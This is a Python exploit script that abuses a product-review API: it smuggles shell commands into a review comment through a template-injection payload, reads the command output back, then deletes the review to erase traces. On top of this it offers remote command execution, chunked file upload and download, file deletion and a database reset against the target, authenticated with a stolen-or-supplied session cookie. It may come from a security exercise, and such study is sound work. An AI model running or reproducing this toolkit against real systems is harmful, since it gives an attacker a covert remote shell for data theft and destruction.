import argparse
import base64
import itertools
import os
import sys
import time

import requests
from jinja2 import Environment, FileSystemLoader


def main():
    parser = argparse.ArgumentParser(description="Upload a file to a server")

    parser.add_argument(
        "-u",
        "--url",
        help="URL of the target server",
    )
    parser.add_argument(
        "-c",
        "--chunksize",
        type=int,
        help="Chunk size for file operations",
        default=65536,
    )  # 64 KiB
    parser.add_argument(
        "-p",
        "--product-id",
        type=str,
        help="Product ID to use for the review. Must be a valid product ID on the target server.",
        required="reset" not in sys.argv,
    )
    parser.add_argument(
        "-s",
        "--sleep",
        type=int,
        help="Sleep duration between requests in seconds. Useful to avoid autoscaling",
    )

    subparsers = parser.add_subparsers(dest="command")
    upload_parser = subparsers.add_parser("upload", help="Upload a file")
    upload_parser.add_argument("file", help="The file to upload")
    upload_parser.add_argument("destination", help="Destination to upload the file to")
    upload_parser.add_argument(
        "-b",
        "--base64-location",
        default="/usr/bin/base64",
        type=str,
        help="Base64 executable location. Uploads as hex if not specified.",
    )

    download_parser = subparsers.add_parser("download", help="Download a file")
    download_parser.add_argument("file", help="The file to download")
    download_parser.add_argument(
        "destination", help="Where to save the downloaded file"
    )
    download_parser.add_argument(
        "-b",
        "--base64-location",
        type=str,
        help="Base64 executable location",
        default="/usr/bin/base64",
    )
    download_parser.add_argument(
        "-d",
        "--dd-location",
        type=str,
        help="DD executable location",
        default="/usr/bin/dd",
    )

    delete_parser = subparsers.add_parser("delete", help="Delete a file or directory")
    delete_parser.add_argument("file", help="The file or directory to delete")

    execute_parser = subparsers.add_parser("execute", help="Execute a command")
    execute_parser.add_argument("script", help="The command to execute")

    _ = subparsers.add_parser("reset", help="Reset the review database")

    args = parser.parse_args()

    init_google_iap()

    if args.command == "upload":
        upload_file(args)
    elif args.command == "download":
        download_file(args)
    elif args.command == "delete":
        delete_file(args)
    elif args.command == "execute":
        execute_command(args)
    elif args.command == "reset":
        reset_database(args)


def upload_file(args: argparse.Namespace):
    with open(args.file, "rb") as f:
        data = f.read()

    if args.base64_location:
        encoded_data = base64.b64encode(data).decode()
    else:
        encoded_data = data.hex()

    env = Environment(
        loader=FileSystemLoader("templates"),
        comment_end_string="===#}",
        comment_start_string="{#===",
    )

    workdir = os.path.dirname(args.destination)
    template = env.get_template("mkdir.bash.j2")
    rendered_template = template.render(
        workdir=workdir,
    )

    print(f"creating {workdir} if it doesn't exist..")
    send_command(rendered_template, args)

    print(f"{workdir} creation done!")

    if args.base64_location:
        template = env.get_template("upload.bash.j2")
    else:
        template = env.get_template("upload_hex.bash.j2")
    for i, chunk in enumerate(itertools.batched(encoded_data, args.chunksize)):
        # split the data into chunks and send each one separately
        if args.sleep:
            time.sleep(args.sleep)

        rendered_template = template.render(
            data="".join(chunk),
            destination=args.destination,
            base64_location=args.base64_location,
        )

        print(f"sending chunk {i}")
        result = send_command(rendered_template, args)
        if result != "ok":
            print(f"chunk {i} upload not successful! Result: {result}. terminating...")
            exit(-1)

    print(f"Your file can now be found at {args.destination}")


def download_file(args: argparse.Namespace):
    env = Environment(
        loader=FileSystemLoader("templates"),
        comment_end_string="===#}",
        comment_start_string="{#===",
    )

    template = env.get_template("download.bash.j2")

    data = b""
    chunk_num = 0

    while True:
        if args.sleep:
            time.sleep(args.sleep)
        print(f"reading chunk {chunk_num}")
        rendered_template = template.render(
            dd_location=args.dd_location,
            base64_location=args.base64_location,
            filename=args.file,
            count=args.chunksize,
            offset=chunk_num,
        )

        print(rendered_template)
        result = send_command(rendered_template, args).strip()
        if result == "":
            print("No more data")
            break

        data += base64.b64decode(result.encode())
        chunk_num += 1

    print("Saving...")
    with open(args.destination, "wb") as f:
        f.write(data)

    print(f"Your file can now be found at {args.destination}")


def delete_file(args: argparse.Namespace):
    env = Environment(
        loader=FileSystemLoader("templates"),
        comment_end_string="===#}",
        comment_start_string="{#===",
    )

    template = env.get_template("rm.bash.j2")
    rendered_template = template.render(
        file=args.remote_file,
    )

    send_command(rendered_template, args)

    print(f"file {args.remote_file} deleted!")


def execute_command(args: argparse.Namespace):
    print("$> " + args.script)
    print(send_command(args.script, args))


def reset_database(args: argparse.Namespace):
    res = session.post(f"{args.url}/api/reviews/reset", json={})

    if res.status_code == 200:
        print("Database reset successful!")
    else:
        print(f"Failed to reset database. Status code: {res.status_code}")


def send_command(command: str, args: argparse.Namespace):
    res = session.post(
        f"{args.url}/api/reviews",
        json={
            "product_id": args.product_id,
            "rating": 5,
            "title": "",
            "comment": injected_payload(command),
        },
    )

    if res.status_code == 201:
        result = res.json()

        # Delete the review once executed
        res = session.delete(f"{args.url}/api/reviews/{result['id']}")

        if res.status_code != 200:
            print(f"Failed to delete review. Status code: {res.status_code}")

        return result["comment"]
    else:
        print(f"Failed to send command. Status code: {res.status_code}")
        exit(-1)


def injected_payload(payload: str):
    payload = payload.replace("\\", "\\\\").replace('"', '\\"').replace("\n", "\\n")
    return f'{{{{getDefaultCharacteristics "\\";{payload};: \\""}}}}'


def init_google_iap():
    global session
    session = requests.Session()

    with open(".auth_token", "r") as f:
        from http.cookies import SimpleCookie

        token = f.read().strip()

        cookie = SimpleCookie()
        cookie.load(token)

        cookies = {k: v.value for k, v in cookie.items()}

        session.cookies.update(cookies)


if __name__ == "__main__":
    main()
